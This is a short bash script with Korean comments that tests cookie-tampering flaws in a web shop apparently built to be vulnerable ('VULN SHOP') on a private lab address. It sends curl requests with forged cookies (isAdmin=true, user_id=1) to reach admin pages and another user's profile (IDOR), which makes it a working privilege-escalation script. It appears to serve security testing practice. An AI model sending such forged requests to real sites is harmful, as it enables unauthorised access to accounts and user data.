#!/bin/bash
# 쿠키 변조 취약점 테스트 스크립트
# 타겟: VULN SHOP

TARGET="http://192.168.0.28:3000"

echo "=== 쿠키 변조 취약점 테스트 ==="
echo "타겟: $TARGET"
echo ""

# 테스트 1: isAdmin 쿠키 변조로 관리자 권한 획득
echo "[테스트 1] isAdmin 쿠키 변조"
echo "원래 쿠키: isAdmin=false"
echo "변조 쿠키: isAdmin=true"
echo ""
echo "메인 페이지 응답:"
curl -s "$TARGET/" -b "user=testuser456; isAdmin=true; user_id=5" | grep -E "(admin|Admin)" | head -5
echo ""

# 테스트 2: 관리자 페이지 접근
echo "[테스트 2] 관리자 페이지 접근"
echo "접근 URL: $TARGET/admin/users"
curl -s "$TARGET/admin/users" -b "user=testuser456; isAdmin=true; user_id=5" | grep -E "(<td|Username)" | head -10
echo ""

# 테스트 3: user_id 변조 (IDOR)
echo "[테스트 3] user_id 변조 (IDOR)"
echo "원래 user_id: 5"
echo "변조 user_id: 1 (admin)"
curl -s "$TARGET/profile" -b "user=admin; isAdmin=false; user_id=1" | grep -E "(admin|testuser)" | head -3
echo ""

# 테스트 4: 관리자 기능 수행 가능성
echo "[테스트 4] 관리자 기능 접근"
echo "상품 관리 페이지:"
curl -s "$TARGET/admin/products" -b "user=testuser456; isAdmin=true; user_id=5" | grep -E "(name=|value=)" | head -5
echo ""

echo "=== 결과 ==="
echo "isAdmin 쿠키를 true로 변조하면 관리자 페이지에 완전히 접근 가능"
echo "user_id 쿠키를 변조하면 다른 사용자 프로필에 접근 가능 (IDOR)"
